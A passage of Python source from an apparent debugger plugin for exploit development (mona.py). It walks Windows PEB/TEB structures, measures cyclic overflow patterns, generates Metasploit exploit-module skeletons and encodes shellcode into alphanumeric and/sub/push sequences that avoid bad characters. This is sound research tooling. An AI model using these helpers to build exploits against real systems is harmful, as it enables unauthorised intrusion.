		self.ProcessParameters    = _read_ptr(peb + self._offsets["ProcessParameters"][self._arch_index])
		self.ProcessHeap          = _read_ptr(peb + self._offsets["ProcessHeap"][self._arch_index])
		self.NumberOfHeaps        = _read_dword(peb + self._offsets["NumberOfHeaps"][self._arch_index])
		self.MaximumNumberOfHeaps = _read_dword(peb + self._offsets["MaximumNumberOfHeaps"][self._arch_index])
		self.ProcessHeaps         = _read_ptr(peb + self._offsets["ProcessHeaps"][self._arch_index])
		self.OSMajorVersion       = _read_dword(peb + self._offsets["OSMajorVersion"][self._arch_index])
		self.OSMinorVersion       = _read_dword(peb + self._offsets["OSMinorVersion"][self._arch_index])
		self.OSBuildNumber        = struct.unpack('<H', dbg.readMemory(peb + self._offsets["OSBuildNumber"][self._arch_index], 2))[0]

		# LdrList is built on demand via get_ldr_list() to avoid triggering
		# MnModule construction (which calls _ensureMnProc) while MnProc.__init__
		# is still on the stack — which would cause unbounded recursion.
		self._ldr_list = None

	@staticmethod
	def get_address():
		"""
		Return the PEB address.
		Cached at mona level (_peb_addr_cache) and at the windbglib Debugger
		instance level (self._peb_addr).
		"""
		global _peb_addr_cache
		if _peb_addr_cache is not None:
			return int(_peb_addr_cache)
		try:
			_peb_addr_cache = dbg.get_peb_addr()
		except Exception:
			teb = get_teb_addr()
			if teb != 0:
				if arch == 32:
					_peb_addr_cache = struct.unpack('<L', dbg.readMemory(teb + 0x30, 4))[0]
				else:
					_peb_addr_cache = struct.unpack('<Q', dbg.readMemory(teb + 0x60, 8))[0]
				if _peb_addr_cache is None:
					_peb_addr_cache = 0
			else:
				_peb_addr_cache = 0
		if _peb_addr_cache is None:
			_peb_addr_cache = 0
		return int(_peb_addr_cache)

	@staticmethod
	def _raw_walk(list_name="InLoadOrderModuleList"):
		"""
		Yield (dll_base, base_name, full_path) for every entry in the
		specified PEB_LDR_DATA linked list.

		No MnPEB instance required.  Results are cached per list_name.
		"""
		if list_name in MnPEB._raw_cache:
			for entry in MnPEB._raw_cache[list_name]:
				yield entry
			return

		def _read_ptr(addr):
			data = dbg.readMemory(addr, PTR_SIZE)
			if len(data) < PTR_SIZE:
				return None
			return struct.unpack(PTR_FMT, data)[0]

		def _wstr(entry, off):
			data = dbg.readMemory(entry + off, 2)
			if len(data) < 2:
				return ""
			length  = struct.unpack('<H', data)[0]
			buf_ptr = _read_ptr(entry + off + PTR_SIZE)
			if not buf_ptr or length == 0:
				return ""
			raw = dbg.readMemory(buf_ptr, length)
			return raw.decode('utf-16-le', errors='replace')

		peb_addr = MnPEB.get_address()
		if peb_addr == 0:
			return
		ldr = _read_ptr(peb_addr + MnPEB._offsets["Ldr"][MnPEB._arch_index])
		if not ldr:
			return

		info = MnPEB._ldr_list_info[list_name]
		list_head     = ldr + info["head_offset"][MnPEB._arch_index]
		link_off      = info["link_offset"][MnPEB._arch_index]
		dll_base_off  = MnPEB._dll_base_off[MnPEB._arch_index]
		full_name_off = MnPEB._full_name_off[MnPEB._arch_index]
		base_name_off = MnPEB._base_name_off[MnPEB._arch_index]

		flink = _read_ptr(list_head)
		results = []
		while flink and flink != list_head:
			entry_base = flink - link_off
			dll_base   = _read_ptr(entry_base + dll_base_off)
			if dll_base is None:
				break
			full_path  = _wstr(entry_base, full_name_off)
			base_name  = _wstr(entry_base, base_name_off)
			results.append((dll_base, base_name, full_path))
			flink = _read_ptr(flink)
			if flink is None:
				break

		# Fallback: if PEB walk failed (e.g. ntdll corrupted), use debug engine
		if not results and __DEBUGGERAPP__ == "WinDBG":
			results = dbglib.getModulesFromDebugger()

		MnPEB._raw_cache[list_name] = results
		for entry in results:
			yield entry

	def get_ldr_list(self):
		"""
		Return the cached LdrList, building it on the first call.
		Lazy so that MnPEB.__init__ does not trigger MnModule construction
		(which needs _ensureMnProc) while MnProc is still being created.
		"""
		if self._ldr_list is None:
			self._ldr_list = self.peb_walk()
		return self._ldr_list

	def peb_walk(self):
		"""
		Walk all three PEB_LDR_DATA module lists and return a dict with
		three keys, each mapping to a list of MnModule objects.

		MnModule objects are created once (during the first list walk) and
		reused by dll_base for subsequent lists, avoiding redundant PE parsing.
		"""
		mod_cache = {}

		result = {}
		for list_name in self._ldr_list_info:
			modules = []
			for dll_base, base_name, _ in MnPEB._raw_walk(list_name):
				if dll_base in mod_cache:
					modules.append(mod_cache[dll_base])
				else:
					try:
						imagename = os.path.splitext(base_name)[0]
						mod = MnModule(imagename)
						mod_cache[dll_base] = mod
						modules.append(mod)
					except Exception:
						pass
			result[list_name] = modules
		return result

	@staticmethod
	def base_from_peb(modulename):
		"""
		Return the load address (DllBase) for *modulename* by walking the PEB.
		Returns 0 if not found.

		Handles deduplicated keys of the form "<stem>_<hexaddr>" that are
		generated by getAllModules() when two modules share the same stem
		(e.g. msedge.exe and msedge.dll both strip to "msedge", so the second
		becomes "msedge_7ff9af680000").  The hex suffix IS the load address, so
		we parse it directly instead of doing a failed name-match walk.
		"""
		try:
			name_lower = os.path.splitext(modulename.lower())[0]
			for dll_base, base_name, _ in MnPEB._raw_walk():
				if os.path.splitext(base_name.lower())[0] == name_lower:
					return dll_base
			m = re.match(r'^(.+)_([0-9a-f]+)$', name_lower)
			if m:
				try:
					candidate = int(m.group(2), 16)
					if candidate >= 0x10000:
						return candidate
				except ValueError:
					pass
			return 0
		except Exception:
			return 0

	@staticmethod
	def path_from_peb(mzbase):
		"""
		Return the full filesystem path for the module loaded at *mzbase*.
		Returns "" if not found.
		"""
		try:
			for dll_base, _, full_path in MnPEB._raw_walk():
				if dll_base == mzbase:
					return full_path
			return ""
		except Exception:
			return ""

class MnTEB:
	"""
	Class representing a Thread Environment Block (TEB).
	Reads fields directly from memory given a TEB address.
	"""

	# TEB / NT_TIB field offsets: (x86, x64)
	_offsets = {
		"ExceptionList": (0x00, 0x00),
		"StackBase":     (0x04, 0x08),
		"StackLimit":    (0x08, 0x10),
		"ProcessId":     (0x20, 0x40),  # ClientId.UniqueProcess
		"ThreadId":      (0x24, 0x48),  # ClientId.UniqueThread
	}

	_arch_index = 1 if arch == 64 else 0

	def __init__(self, teb_addr, peb=None):
		self.TEBAddress = teb_addr

		# Reference to the shared MnPEB (from MnProc), not a new instance
		self.PEB = peb

		def _read_ptr(addr):
			return struct.unpack(PTR_FMT, dbg.readMemory(addr, PTR_SIZE))[0]

		def _read_dword(addr):
			return struct.unpack('<L', dbg.readMemory(addr, 4))[0]

		self.StackBase  = _read_ptr(teb_addr + self._offsets["StackBase"][self._arch_index])
		self.StackLimit = _read_ptr(teb_addr + self._offsets["StackLimit"][self._arch_index])
		self.ProcessId  = _read_dword(teb_addr + self._offsets["ProcessId"][self._arch_index])
		self.Id         = _read_dword(teb_addr + self._offsets["ThreadId"][self._arch_index])

		# SEH chain: list of [record_addr, handler_addr]; x64 has no chain
		if arch == 32:
			self.SEHChain = []
			nextrecord = _read_ptr(teb_addr + self._offsets["ExceptionList"][self._arch_index])
			while nextrecord != 0xFFFFFFFF and nextrecord != 0:
				try:
					nseh = _read_ptr(nextrecord)
					seh  = _read_ptr(nextrecord + 4)
					self.SEHChain.append([nextrecord, seh])
					nextrecord = nseh
				except Exception:
					break
			self.SEHCount = len(self.SEHChain)

	@staticmethod
	def getByAddress(teb_addr):
		"""Return the MnTEB with the given TEB address from the MnProc cache, or None."""
		_ensureMnProc(entities=["threads"])
		for tid, mteb in mnproc.getThreads().items():
			if mteb.TEBAddress == teb_addr:
				return mteb
		return None

def getModuleObj(modname):
	"""
	Will return a module object if the provided module name exists
	Will perform a case sensitive search first,
	and then a case insensitive search in case nothing was found
	"""
	# Method 1
	mod = dbg.getModule(modname)
	if mod is not None:
		return MnModule(modname)
	# Method 2

	suffixes = ["",".exe",".dll"]
	allmod = dbg.getAllModules()
	for suf in suffixes:
		modname_search = modname + suf	
		
		#WinDBG optimized
		if __DEBUGGERAPP__ == "WinDBG":	
			for tmod_s in allmod:
				tmod = dbg.getModule(tmod_s)
				if not tmod == None:
					if tmod.getName() == modname_search:
						return MnModule(tmod_s)
					imname = dbg.getImageNameForModule(tmod.getName())
					if not imname == None:
						if imname == modname_search:
							return MnModule(tmod)
			for tmod_s in allmod:
				tmod = dbg.getModule(tmod_s)
				if not tmod == None:
					if tmod.getName().lower() == modname_search.lower():
						return MnModule(tmod_s)
					imname = dbg.getImageNameForModule(tmod.getName().lower())
					if not imname == None:
						if imname.lower() == modname_search.lower():
							return MnModule(tmod)
			for tmod_s in allmod:
				tmod = dbg.getModule(tmod_s)
				if not tmod == None:
					if tmod_s.lower() == modname_search.lower():
						return MnModule(tmod_s)
		else:
			# Immunity
			for tmod_s in allmod:
				if not tmod_s == None:
					mname = tmod_s.getName()
					if mname == modname_search:
						return MnModule(mname)
			for tmod_s in allmod:
				if not tmod_s == None:
					mname = tmod_s.getName()
					if mname.lower() == modname_search.lower():
						return MnModule(mname)
		
	return None
	
		
		
def getPatternLength(startptr, pattern_type="normal", args=None):
	"""
	Gets length of a cyclic pattern, starting from a given pointer
	
	Arguments:
	startptr - the start pointer (integer value)
	pattern_type - optional string, indicating type of pattern :
		"normal" : normal pattern
		"unicode" : unicode pattern
		"upper" : uppercase pattern
		"lower" : lowercase pattern
	"""
	patternsize = 0
	endofpattern = False
	global silent

	if args is None:
		args = {}

	oldsilent = silent
	silent = True
	fullpattern = ensure_bytes(createPattern(200000, args))
	silent = oldsilent

	if pattern_type == "upper":
		fullpattern = fullpattern.upper()
	if pattern_type == "lower":
		fullpattern = fullpattern.lower()
	#if pattern_type == "unicode":
	#	fullpattern = toUnicode(fullpattern)

	if pattern_type in ["normal", "upper", "lower", "unicode"]:
		previousloc = -1
		while not endofpattern and patternsize <= len(fullpattern):
			if pattern_type == "unicode":
				sizemeter = dbg.readMemory(startptr + patternsize, 8)
				sizemeter = sizemeter.replace(b"\x00", b"")
			else:
				sizemeter = dbg.readMemory(startptr + patternsize, 4)

			if len(sizemeter) == 4:
				thisloc = fullpattern.find(sizemeter)
				if thisloc < 0 or thisloc <= previousloc:
					endofpattern = True
				else:
					patternsize += 4
					previousloc = thisloc
			else:
				return patternsize

		# maybe this is not the end yet
		patternsize -= 8
		endofpattern = False

		while not endofpattern and patternsize <= len(fullpattern):
			if pattern_type == "unicode":
				sizemeter = dbg.readMemory(startptr + patternsize, 8)
				sizemeter = sizemeter.replace(b"\x00", b"")
			else:
				sizemeter = dbg.readMemory(startptr + patternsize, 4)

			if fullpattern.find(sizemeter) < 0:
				patternsize += 3
				endofpattern = True
			else:
				patternsize += 1

	if pattern_type == "unicode":
		patternsize = (patternsize // 2) + 1

	return patternsize
	
def getAPointer(modules,criteria,accesslevel):
	"""
	Gets the first pointer from one of the supplied module that meets a set of criteria
	
	Arguments:
	modules - array with module names
	criteria - dictionary describing the criteria the pointer needs to comply with
	accesslevel - the required access level
	
	Return:
	a pointer (integer value) or 0 if nothing was found
	"""
	pointer = 0
	dbg.getMemoryPages()
	for a in dbg.MemoryPages.keys():
			page_start = a
			page_size  = dbg.MemoryPages[a].getSize()
			page_end   = a + page_size
			#page in one of the modules ?
			if meetsAccessLevel(dbg.MemoryPages[a],accesslevel):
				pageptr = MnPointer(a)
				thismodulename = pageptr.belongsTo()
				if thismodulename != "" and thismodulename in modules:
					thismod = MnModule(thismodulename)
					start = thismod.moduleBase
					end = thismod.moduleTop
					random.seed()
					for cnt in xrange(page_size+1):
						#randomize the value
						theoffset = random.randint(0,page_size)
						thispointer = MnPointer(page_start + theoffset)
						if meetsCriteria(thispointer,criteria):
							return page_start + theoffset
	return pointer
	
	
def haveRepetition(string, pos):
	first =  string[pos]
	MIN_REPETITION = 3		
	if len(string) - pos > MIN_REPETITION:
		count = 1
		while ( count < MIN_REPETITION and string[pos+count] ==  first):
			count += 1
		if count >= MIN_REPETITION:
			return True
	return False


def findAllPaths(graph,start_vertex,end_vertex,path=[]):
	path = path + [start_vertex]
	if start_vertex == end_vertex:
		return [path]
	if start_vertex not in graph:
		return []
	paths = []
	for vertex in graph[start_vertex]:
		if vertex not in path:
			extended_paths = findAllPaths(graph,vertex,end_vertex,path)
			for p in extended_paths:
				paths.append(p)
	return paths



def isAsciiString(data):
	"""
	Check if a given string only contains ascii characters
	"""
	return all((_ord(c) >= 32 and _ord(c) <= 127) for c in data)
	
def isAscii(b):
	"""
	Check if a given hex byte is ascii or not
	
	Argument : the byte
	Returns : Boolean
	"""
	return b == 0x0a or b == 0x0d or (b >= 0x20 and b <= 0x7e)
	
def isAscii2(b):
	"""
	Check if a given hex byte is ascii or not, will not flag newline or carriage return as ascii
	
	Argument : the byte
	Returns : Boolean
	"""
	return b >= 0x20 and b <= 0x7e	
	
def isHexString(input):
	"""
	Checks if all characters in a string are hex (0->9, a->f, A->F)
	Alias for isAddress()
	"""
	return isAddress(input)

def extract_chunks(iterable, size):
	""" Retrieves chunks of the given :size from the :iterable """
	fill = object()
	gen = izip_longest(fillvalue=fill, *([iter(iterable)] * size))
	return (tuple(x for x in chunk if x != fill) for chunk in gen)

def rrange(x, y = 0):
	""" Creates a reversed range (from x - 1 down to y).
	
	Example:
	>>> rrange(10, 0) # => [9, 8, 7, 6, 5, 4, 3, 2, 1, 0]
	"""
	return range(x - 1, y - 1, -1)

def getSkeletonHeader(exploittype,portnr,extension,url,badchars='\x00\x0a\x0d'):

	originalauthor = "insert_name_of_person_who_discovered_the_vulnerability"
	name = "insert name for the exploit"
	cve = "insert CVE number here"
	
	if url == "":
		url = "<insert another link to the exploit/advisory here>"
	else:
		try:
			# connect to url & get author + app description
			u = urllib_urlretrieve(url)
			# extract title
			fh = open(u[0],'r')
			contents = fh.readlines()
			fh.close()
			for line in contents:
				if line.find('<h1') > -1:
					titleline = line.split('>')
					if len(titleline) > 1:
						name = titleline[1].split('<')[0].replace("\"","").replace("'","").strip()
					break
			for line in contents:
				if line.find('Author:') > -1 and line.find('td style') > -1:
					authorline = line.split("Author:")
					if len(authorline) > 1:
						originalauthor = authorline[1].split('<')[0].replace("\"","").replace("'","").strip()
					break
			for line in contents:
				if line.find('CVE:') > -1 and line.find('td style') > -1:
					cveline = line.split("CVE:")
					if len(cveline) > 1:
						tcveparts = cveline[1].split('>')
						if len(tcveparts) > 1:
							tcve = tcveparts[1].split('<')[0].replace("\"","").replace("'","").strip()
							if tcve.upper().strip() != "N//A":
								cve = tcve
					break					
		except:
			dbg.log(" ** Unable to download %s" % url,highlight=1)
			url = "<insert another link to the exploit/advisory here>"
	
	monaConfig = MnConfig()
	thisauthor = monaConfig.get("author")
	if thisauthor == "":
		thisauthor = "<insert your name here>"

	skeletonheader = "##\n"
	skeletonheader += "# This module requires Metasploit: http://metasploit.com/download\n"
	skeletonheader += "# Current source: https://github.com/rapid7/metasploit-framework\n"
	skeletonheader += "##\n\n"
	skeletonheader += "require 'msf/core'\n\n"
	skeletonheader += "class MetasploitModule < Msf::Exploit::Remote\n"
	skeletonheader += "  #Rank definition: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking\n"
	skeletonheader += "  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking\n"
	skeletonheader += "  Rank = NormalRanking\n\n"
	
	if exploittype == "fileformat":
		skeletonheader += "  include Msf::Exploit::FILEFORMAT\n"
	if exploittype == "network client (tcp)":
		skeletonheader += "  include Msf::Exploit::Remote::Tcp\n"
	if exploittype == "network client (udp)":
		skeletonheader += "  include Msf::Exploit::Remote::Udp\n"
		
	if cve.strip() == "":
		cve = "<insert CVE number here>"
		
	skeletoninit = "  def initialize(info = {})\n"
	skeletoninit += "    super(update_info(info,\n"
	skeletoninit += "      'Name'    => '" + name + "',\n"
	skeletoninit += "      'Description'  => %q{\n"
	skeletoninit += "          Provide information about the vulnerability / explain as good as you can\n"
	skeletoninit += "          Make sure to keep each line less than 100 columns wide\n"
	skeletoninit += "      },\n"
	skeletoninit += "      'License'    => MSF_LICENSE,\n"
	skeletoninit += "      'Author'    =>\n"
	skeletoninit += "        [\n"
	skeletoninit += "          '" + originalauthor + "<user[at]domain.com>',  # Original discovery\n"
	skeletoninit += "          '" + thisauthor + "',  # MSF Module\n"		
	skeletoninit += "        ],\n"
	skeletoninit += "      'References'  =>\n"
	skeletoninit += "        [\n"
	skeletoninit += "          [ 'OSVDB', '<insert OSVDB number here>' ],\n"
	skeletoninit += "          [ 'CVE', '" + cve + "' ],\n"
	skeletoninit += "          [ 'URL', '" + url + "' ]\n"
	skeletoninit += "        ],\n"
	skeletoninit += "      'DefaultOptions' =>\n"
	skeletoninit += "        {\n"
	skeletoninit += "          'ExitFunction' => 'process', #none/process/thread/seh\n"
	skeletoninit += "          #'InitialAutoRunScript' => 'migrate -f',\n"	
	skeletoninit += "        },\n"
	skeletoninit += "      'Platform'  => 'win',\n"
	skeletoninit += "      'Payload'  =>\n"
	skeletoninit += "        {\n"
	skeletoninit += "          'BadChars' => \"" + bin2hexstr(badchars) + "\", # <change if needed>\n"
	skeletoninit += "          'DisableNops' => true,\n"
	skeletoninit += "        },\n"
	
	skeletoninit2 = "      'Privileged'  => false,\n"
	skeletoninit2 += "      #Correct Date Format: \"M D Y\"\n"
	skeletoninit2 += "      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec\n"
	skeletoninit2 += "      'DisclosureDate'  => 'MONTH DAY YEAR',\n"
	skeletoninit2 += "      'DefaultTarget'  => 0))\n"
	
	if exploittype.find("network") > -1:
		skeletoninit2 += "\n    register_options([Opt::RPORT(" + str(portnr) + ")], self.class)\n"
	if exploittype.find("fileformat") > -1:
		skeletoninit2 += "\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf" + extension + "']),], self.class)\n"
	skeletoninit2 += "\n  end\n\n"
	
	return skeletonheader,skeletoninit,skeletoninit2

def shortJump(sizeofinst, offset):
	"""
	Calculate the parameter for a short relative jump from the size of instruction (which can be JMP, JNZ etc...) and the desired offset
	Arguments:
	sizeofinst - the size of the instruction used to achieve the jump
	offset - the desired offset from the address of the instruction
	Return:
	A binary value which can be used along with the jump instruction
	"""
	if (offset - sizeofinst) < -128 or (offset - sizeofinst) > 127:
		dbg.log(" ** short jump too long",highlight=1)
	return struct.pack("b", offset - sizeofinst)

def archValue(x86, x64):
	if arch == 32:
		return x86
	elif arch == 64:
		return x64

def readPtrSizeBytes(ptr):
	if arch == 32:
		data = dbg.readMemory(ptr,4)
		expected = 4
		fmt = '<L'
	elif arch == 64:
		data = dbg.readMemory(ptr,8)
		expected = 8
		fmt = '<Q'
	if not data or len(data) < expected:
		dbgp("readPtrSizeBytes(0x%x): readMemory returned %s bytes" % (ptr, len(data) if data else 0))
		return 0
	return struct.unpack(fmt, data)[0]

def getOsOffset(name):
	osrelease = dbg.getOsRelease()
	dbgp("getOsOffset('%s'): osrelease='%s' (type: %s)" % (name, str(osrelease), type(osrelease).__name__))

	major = 0
	minor = 0
	build = 0

	if isinstance(osrelease, tuple):
		# Immunity format: (Major, Minor, Build, Platform, CSD)
		try:
			major = int(osrelease[0])
			minor = int(osrelease[1])
			build = int(osrelease[2])
		except:
			pass
	else:
		# WinDBG format: "major.minor.build"
		osreleaseparts = str(osrelease).split(".")
		if len(osreleaseparts) >= 3:
			try:
				major = int(osreleaseparts[0])
				minor = int(osreleaseparts[1])
				build = int(osreleaseparts[2])
			except:
				pass

	dbgp("getOsOffset('%s'): major=%d, minor=%d, build=%d" % (name, major, minor, build))

	offset_category = "xp"
	if major == 6 and minor == 0:
		offset_category = "vista"
	elif major == 6 and minor == 1:
		offset_category = "win7"
	elif major == 6 and minor in [2, 3]:
		offset_category = "win8"
	elif major == 10 and minor == 0:
		offset_category = "win10"

	offset_category_index = offset_categories.index(offset_category)
	dbgp("getOsOffset('%s'): category='%s' (index=%d)" % (name, offset_category, offset_category_index))

	offset = 0
	curr_category = "xp"
	for c in offset_categories:
		if not c in offsets[name]:
			continue
		if offset_categories.index(c) > offset_category_index:
			break
		curr_category = c
		if curr_category != "win10":
			offset = offsets[name][c]
		else:
			win10offsets = offsets[name][c]
			for o in sorted(win10offsets):
				if o > build:
					break
				curr_build = o
				offset = win10offsets[o]

	result = archValue(offset[0], offset[1])
	dbgp("getOsOffset('%s'): matched category='%s', offset=0x%x" % (name, curr_category, result))
	return result

#---------------------------------------#
#   Class to call commands & parse args #
#---------------------------------------#

class MnCommand:
	"""
	Class to call commands, show usage and parse arguments
	"""
	def __init__(self, name, description, usage, parseProc, alias="", archs=[32]):
		self.name = name
		self.description = description
		self.usage = usage
		self.parseProc = parseProc
		self.alias = alias
		self.supportedarchs = archs

#---------------------------------------#
#   Class to encode bytes               #
#---------------------------------------#

class MnEncoder:
	""" 
	Class to encode bytes
	"""

	def __init__(self,bytestoencode):
		self.origbytestoencode = bytestoencode
		self.bytestoencode = bytestoencode

	def encodeAlphaNum(self,badchars = []):
		encodedbytes = {}
		if not silent:
			dbg.log("[+] Using alphanum encoder")
			dbg.log("[+] Received %d bytes to encode" % len(self.origbytestoencode))
			dbg.log("    %s" % bin2hexstr(self.origbytestoencode))
			dbg.log("[+] Nr of bad chars: %d" % len(badchars))
		# first, check if there are no bad char conflicts
		nobadchars = b"\x25\x2a\x2d\x31\x32\x35\x4a\x4d\x4e\x50\x55"
		badbadchars = False
		for b in badchars:
			if b in nobadchars:
				dbg.log("*** Error: byte \\x%s cannot be a bad char with this encoder" % bin2hex(b))
				badbadchars = True

		if badbadchars:
			return {}				

		# if all is well, explode the input to a multiple of 4
		while True:
			moduloresult = len(self.bytestoencode) % 4
			if moduloresult == 0:
				break
			else:
				self.bytestoencode += b'\x90'
		if not len(self.bytestoencode) == len(self.origbytestoencode):
			if not silent:
				dbg.log("[+] Added %d nops to make length of input a multiple of 4" % (len(self.bytestoencode) - len(self.origbytestoencode)))

		# break it down into chunks of 4 bytes
		toencodearray = []
		toencodearray = [self.bytestoencode[max(i-4,0):i] for i in range(len(self.bytestoencode), 0, -4)][::-1]
		blockcnt = 1
		encodedline = 0
		# we have to push the blocks in reverse order
		blockcnt = len(toencodearray)
		nrblocks = len(toencodearray)
		while blockcnt > 0:
			if not silent:
				dbg.log("[+] Processing block %d/%d" % (blockcnt,nrblocks))
			encodedbytes[encodedline] = [b"\x25\x4a\x4d\x4e\x55","and eax,0x554E4D4A"]
			encodedline += 1
			encodedbytes[encodedline] = [b"\x25\x35\x32\x31\x2A","and eax,0x2A313235"]
			encodedline += 1
	
			opcodes=[]
			startpos=7
			source = bin2hex(toencodearray[blockcnt-1]).replace(" ", "")
			
			origbytes=source[startpos-7]+source[startpos-6]+source[startpos-5]+source[startpos-4]+source[startpos-3]+source[startpos-2]+source[startpos-1]+source[startpos]
			reversebytes=origbytes[6]+origbytes[7]+origbytes[4]+origbytes[5]+origbytes[2]+origbytes[3]+origbytes[0]+origbytes[1]
			revval=hexStrToInt(reversebytes)			   
			twoval=4294967296-revval
			twobytes=toHex(twoval)
			if not silent:	
				dbg.log("Opcode to produce : %s%s %s%s %s%s %s%s" % (origbytes[0],origbytes[1],origbytes[2],origbytes[3],origbytes[4],origbytes[5],origbytes[6],origbytes[7]))
				dbg.log("         reversed : %s%s %s%s %s%s %s%s" % (reversebytes[0],reversebytes[1],reversebytes[2],reversebytes[3],reversebytes[4],reversebytes[5],reversebytes[6],reversebytes[7]))
				dbg.log("                    -----------")				   
				dbg.log("   2's complement : %s%s %s%s %s%s %s%s" % (twobytes[0],twobytes[1],twobytes[2],twobytes[3],twobytes[4],twobytes[5],twobytes[6],twobytes[7]))
		
			#for each byte, start with last one first
			bcnt=3
			overflow=0		
			while bcnt >= 0:
				currbyte=twobytes[(bcnt*2)]+twobytes[(bcnt*2)+1]
				currval=hexStrToInt(currbyte)-overflow
				testval=currval//3

				if testval < 32:
					#put 1 in front of byte
					currbyte="1"+currbyte
					currval=hexStrToInt(currbyte)-overflow
					overflow=1
				else:
					overflow=0

				val1=currval//3
				val2=currval//3
				val3=currval//3
				sumval=val1+val2+val3
				
				if sumval < currval:
					val3 = val3 + (currval-sumval)

				#validate / fix badchars
				
				fixvals=self.validatebadchars_enc(val1,val2,val3,badchars)
				val1="%02x" % fixvals[0]
				val2="%02x" % fixvals[1]
				val3="%02x" % fixvals[2]			
				opcodes.append(val1)
				opcodes.append(val2)
				opcodes.append(val3)
				bcnt=bcnt-1

			# we should now have 12 bytes in opcodes
			if not silent:
				dbg.log("                    -----------")
				dbg.log("                    %s %s %s %s" % (opcodes[9],opcodes[6],opcodes[3],opcodes[0]))
				dbg.log("                    %s %s %s %s" % (opcodes[10],opcodes[7],opcodes[4],opcodes[1]))
				dbg.log("                    %s %s %s %s" % (opcodes[11],opcodes[8],opcodes[5],opcodes[2]))
				dbg.log("")
			thisencodedbyte = b"\x2D"
			thisencodedbyte += hex2bin("\\x%s" % opcodes[0])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[3])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[6])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[9])
			encodedbytes[encodedline] = [thisencodedbyte,"sub eax,0x%s%s%s%s" % (opcodes[9],opcodes[6],opcodes[3],opcodes[0])]
			encodedline += 1

			thisencodedbyte = b"\x2D"
			thisencodedbyte += hex2bin("\\x%s" % opcodes[1])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[4])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[7])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[10])
			encodedbytes[encodedline] = [thisencodedbyte,"sub eax,0x%s%s%s%s" % (opcodes[10],opcodes[7],opcodes[4],opcodes[1])]
			encodedline += 1

			thisencodedbyte = b"\x2D"
			thisencodedbyte += hex2bin("\\x%s" % opcodes[2])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[5])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[8])
			thisencodedbyte += hex2bin("\\x%s" % opcodes[11])
			encodedbytes[encodedline] = [thisencodedbyte,"sub eax,0x%s%s%s%s" % (opcodes[11],opcodes[8],opcodes[5],opcodes[2])]
			encodedline += 1

			encodedbytes[encodedline] = [b"\x50","push eax"]
			encodedline += 1
			
			blockcnt -= 1
	

		return encodedbytes



	def validatebadchars_enc(self,val1,val2,val3,badchars):
		newvals=[]
		allok=0
		giveup=0
		type=0
		origval1=val1
		origval2=val2
		origval3=val3
		d1=0
		d2=0
		d3=0
		lastd1=0
		lastd2=0
		lastd3=0	
		while allok==0 and giveup==0:
			#check if there are bad chars left
			charcnt=0
			val1ok=1
			val2ok=1
			val3ok=1
			while charcnt < len(badchars):
				if (hex2bin("%02x" % val1) in badchars):
					val1ok=0
				if (hex2bin("%02x" % val2) in badchars):
					val2ok=0
				if (hex2bin("%02x" % val3) in badchars):
					val3ok=0
				charcnt=charcnt+1		
			if (val1ok==0) or (val2ok==0) or (val3ok==0):
				allok=0
			else:
				allok=1
			if allok==0:
				#try first by sub 1 from val1 and val2, and add more to val3
				if type==0:
					val1=val1-1
					val2=val2-1
					val3=val3+2
					if (val1<1) or (val2==0) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						type=1
				if type==1:			  
				#then try by add 1 to val1 and val2, and sub more from val3
					val1=val1+1
					val2=val2+1
					val3=val3-2
					if (val1>126) or (val2>126) or (val3 < 1):
						val1=origval1
						val2=origval2
						val3=origval3
						type=2	
				if type==2:
					#try by sub 2 from val1, and add 1 to val2 and val3
					val1=val1-2
					val2=val2+1
					val3=val3+1
					if (val1<1) or (val2>126) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						type=3
				if type==3:
					#try by add 2 to val1, and sub 1 from val2 and val3
					val1=val1+2
					val2=val2-1
					val3=val3-1
					if (val1 > 126) or (val2 < 1) or (val3 < 1):
						val1=origval1
						val2=origval2
						val3=origval3
						type=4
				if type==4:
					if (val1ok==0):
						val1=val1-1
						d1=d1+1
					else:
						#now spread delta over other 2 values
						if (d1 > 0):
							val2=val2+1
							val3=origval3+d1-1
							d1=d1-1
						else:
							val1=0					
					if (val1 < 1) or (val2 > 126) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						d1=0					
						type=5
				if type==5:
					if (val1ok==0):
						val1=val1+1
						d1=d1+1
					else:
						#now spread delta over other 2 values
						if (d1 > 0):
							val2=val2-1
							val3=origval3-d1+1
							d1=d1-1
						else:
							val1=255					
					if (val1>126) or (val2 < 1) or (val3 < 1):
						val1=origval1
						val2=origval2
						val3=origval3
						val1ok=0
						val2ok=0
						val3ok=0					
						d1=0
						d2=0
						d3=0					
						type=6
				if type==6:
					if (val1ok==0):
						val1=val1-1
						#d1=d1+1
					if (val2ok==0):
						val2=val2+1
						#d2=d2+1
					d3=origval1-val1+origval2-val2
					val3=origval3+d3
					if (lastd3==d3) and (d3 > 0):
						val1=origval1
						val2=origval2
						val3=origval3				
						giveup=1
					else:
						lastd3=d3			
					if (val1<1) or (val2 < 1) or (val3 > 126):
						val1=origval1
						val2=origval2
						val3=origval3
						giveup=1
		#check results
		charcnt=0
		val1ok=1
		val2ok=1
		val3ok=1	
		val1text="OK"	
		val2text="OK"
		val3text="OK"	
		while charcnt < len(badchars):
			if (val1 == badchars[charcnt]):
				val1ok=0
				val1text="NOK"			
			if (val2 == badchars[charcnt]):
				val2ok=0
				val2text="NOK"						
			if (val3 == badchars[charcnt]):
				val3ok=0
				val3text="NOK"						
			charcnt=charcnt+1	
			
		if (val1ok==0) or (val2ok==0) or (val3ok==0):
			dbg.log("  ** Unable to fix bad char issue !",highlight=1)
			dbg.log("	  -> Values to check : %s(%s) %s(%s) %s(%s) " % (bin2hex(origval1),val1text,bin2hex(origval2),val2text,bin2hex(origval3),val3text),highlight=1)	
			val1=origval1
			val2=origval2
			val3=origval3		
		newvals.append(val1)
		newvals.append(val2)
